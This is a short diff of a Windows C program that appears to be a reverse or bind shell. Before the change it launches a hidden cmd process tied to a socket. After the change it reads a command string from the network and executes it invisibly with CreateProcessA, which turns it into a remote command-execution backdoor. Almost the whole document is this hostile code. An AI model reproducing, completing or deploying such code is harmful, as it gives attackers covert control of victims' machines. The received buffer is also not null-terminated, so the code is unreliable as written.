@@ -67,9 +67,12 @@ int main(int argc, char* argv[]) {
 
 	PROCESS_INFORMATION pinfo;
 
+	char opt[30];
+	recv(sockfd, opt, sizeof opt, 0);
+
 	// Windows magic
 
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+	CreateProcessA(NULL, opt, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
 	return 0;
 }
